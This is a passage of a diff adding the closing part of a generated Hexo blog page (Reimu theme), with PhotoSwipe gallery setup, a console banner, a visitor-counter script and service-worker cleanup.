+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
